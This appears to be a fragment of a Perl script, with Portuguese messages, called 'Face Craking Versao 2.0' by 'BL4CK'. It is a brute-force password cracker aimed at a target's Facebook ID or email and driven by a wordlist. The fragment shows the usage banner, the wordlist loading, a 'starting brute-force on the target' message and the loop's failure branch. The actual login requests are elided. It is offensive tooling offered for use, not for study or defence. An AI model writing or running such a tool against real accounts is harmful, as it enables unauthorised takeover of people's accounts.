...
system('clear');
print "\n+++ Face Craking Versao 2.0\n";
print "+++ SPIRNADS FLACKS\n";
print "+++ By BL4CK\n\n";
print "+++ Comando: perl $0 ID ou Email do alvo wordlist.txt\n\n";
exit; }

my $user = $ARGV[0];
my $wordlist = $ARGV[1];

open (LIST, $wordlist) || die "\n[-] WordList nao encontrada $wordlist -_- \n";

print "\n+++ Face Craking Versao 2.0\n";
print "+++ SPIRNADS FLACKS\n";
print "+++ By BL4CK\n\n";
print "\n[+] Iniciando Brute-force no Alvo: $user ...\n\n";
...
if (!defined $success)
{
print "[-] $password -> !SENHA INCORRETA! \n";
close SSL;
}
else
{
